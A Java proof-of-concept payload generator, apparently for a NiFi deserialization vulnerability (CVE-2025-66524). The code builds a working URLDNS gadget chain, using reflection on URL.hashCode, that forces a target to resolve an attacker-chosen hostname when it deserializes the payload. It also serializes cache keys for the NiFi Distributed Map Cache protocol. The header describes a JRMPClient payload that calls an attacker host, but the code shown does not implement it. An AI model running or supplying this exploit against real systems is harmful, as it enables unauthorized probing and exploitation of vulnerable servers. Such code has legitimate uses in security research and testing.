import java.io.*;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

/**
 * Generates Java deserialization payloads for CVE-2025-66524 PoC.
 *
 * Payload 1: URLDNS — Triggers DNS resolution during HashMap deserialization.
 *   JDK-only, no external dependencies, guaranteed to work.
 *
 * Payload 2: JRMPClient — Triggers TCP connection to attacker host:port
 *   during deserialization of RMI stub. JDK-only.
 */
public class PayloadGenerator {

    /**
     * Custom URLStreamHandler that prevents DNS resolution during serialization.
     * On deserialization, the default handler is used, which DOES resolve DNS.
     */
    static class SilentURLStreamHandler extends URLStreamHandler {
        @Override
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        @Override
        protected synchronized InetAddress getHostAddress(URL u) {
            return null; // Don't resolve during serialization
        }
    }

    /**
     * Generate URLDNS payload.
     * On deserialization: HashMap.readObject() → hash(URL) → URL.hashCode()
     *   → URLStreamHandler.hashCode(URL) → getHostAddress(URL) → DNS lookup
     */
    public static byte[] generateURlDNS(String hostname) throws Exception {
        // Create URL with our silent handler (no DNS during construction)
        URLStreamHandler handler = new SilentURLStreamHandler();
        HashMap<URL, String> hashMap = new HashMap<>();
        URL url = new URL(null, "http://" + hostname + "/", handler);

        // Use reflection to set URL.hashCode to a non-(-1) value
        // This prevents DNS resolution during HashMap.put()
        Field hashCodeField = URL.class.getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);
        hashCodeField.setInt(url, 0xDEADBEEF);

        hashMap.put(url, hostname);

        // Now set hashCode back to -1 so it will be recalculated during deserialization
        // HashMap.readObject() → hash(key) → URL.hashCode() → triggers DNS
        hashCodeField.setInt(url, -1);

        // Serialize
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashMap);
        oos.close();

        return baos.toByteArray();
    }

    /**
     * Serialize a Java String using ObjectOutputStream (matches GenericObjectSerDe.serialize).
     * Used to create cache keys in the NiFi Distributed Map Cache protocol.
     */
    public static byte[] serializeString(String s) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(s);
        oos.close();
        return baos.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        if (args.length < 3) {
            System.err.println("Usage: PayloadGenerator <type> <param> <outfile>");
            System.err.println("  Types: urldns <hostname> <outfile>");
            System.err.println("         key <processor-uuid> <outfile>");
            System.exit(1);
        }

        String type = args[0];
        String param = args[1];
        String outFile = args[2];

        byte[] payload;

        switch (type) {
            case "urldns":
                payload = generateURlDNS(param);
                System.out.println("[+] Generated URLDNS payload for: " + param);
                break;

            case "key":
                payload = serializeString(param);
                System.out.println("[+] Generated serialized key for: " + param);
                break;

            default:
                System.err.println("Unknown type: " + type);
                System.exit(1);
                return;
        }

        // Write to file
        try (FileOutputStream fos = new FileOutputStream(outFile)) {
            fos.write(payload);
        }

        // Print hex for debugging
        System.out.println("[+] Size: " + payload.length + " bytes");
        System.out.print("[+] First 32 bytes (hex): ");
        for (int i = 0; i < Math.min(32, payload.length); i++) {
            System.out.printf("%02x", payload[i] & 0xFF);
        }
        System.out.println();
        System.out.println("[+] Written to: " + outFile);
    }
}
